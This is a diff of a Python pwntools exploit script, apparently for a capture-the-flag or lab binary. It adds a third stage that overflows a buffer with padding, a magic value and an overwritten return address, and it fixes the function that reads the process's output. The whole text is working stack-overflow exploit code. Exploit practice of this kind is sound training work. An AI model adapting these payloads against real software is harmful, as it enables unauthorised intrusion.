@@ -17,8 +17,10 @@ p.sendline(main_payload)
 print(str(main_payload, encoding="ascii"))
 print(p.recvline())
 
+
 def receve_input(proc_pipe):
-    print(str(proc_pipe, encoding="ascii"))
+    print(str(proc_pipe.recvline(), encoding="ascii"))
+
 
 def challenge_1():
     receve_input(p)
@@ -32,16 +34,29 @@ def challenge_1():
     p.sendline(c1_payload)
     receve_input(p)
 
+
 def check_2():
     receve_input(p)
     c2_payload = bytearray()
     c2_payload += b"a" * 28
     c2_payload += pwn.p32(0xdeadbeef)
-    c2_payload += b"b" * 8
+    c2_payload += pwn.p64(0)
     c2_payload += pwn.p64(0x4012cc)
+    p.sendline(c2_payload)
+    receve_input(p)
+
+
+def check_3():
+    receve_input(p)
+    c2_payload = bytearray()
+    c2_payload += b"a" * 28
+    c2_payload += pwn.p32(0x13371337)
+    c2_payload += pwn.p64(0)
+    c2_payload += pwn.p64(0x401334)
+    p.sendline(c2_payload)
     receve_input(p)
 
 
 challenge_1()
 check_2()
-p.interactive()
+check_3()
